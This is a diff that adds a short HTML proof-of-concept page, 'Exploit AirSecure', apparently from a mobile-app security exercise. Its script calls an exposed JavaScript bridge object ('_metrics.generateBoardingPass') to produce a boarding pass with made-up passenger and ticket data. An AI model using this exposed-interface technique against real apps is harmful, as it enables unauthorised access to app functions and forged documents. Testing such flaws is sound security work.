@@ -1,1 +1,45 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Exploit AirSecure</title>
+</head>
+<body>
 
+<h2>Exploit AirSecure</h2>
+<button onclick="run()">Ejecutar exploit</button>
+
+<pre id="output"></pre>
+
+<script>
+function log(msg) {
+    document.getElementById("output").textContent += msg + "\n";
+}
+
+function run() {
+    try {
+        if (typeof _metrics === "undefined") {
+            log("❌ _metrics no existe (la app no cargó la interfaz)");
+            return;
+        }
+
+        log("✅ Llamando a generateBoardingPass...");
+
+        let result = _metrics.generateBoardingPass(
+            "Jane Doe",          // nombre
+            "14A",               // asiento
+            14,                  // fila
+            "BP1337",            // vuelo
+            "847-2993187054"     // e-ticket
+        );
+
+        log("🎯 Resultado: " + result);
+
+    } catch (e) {
+        log("❌ Error: " + e);
+    }
+}
+</script>
+
+</body>
+</html>
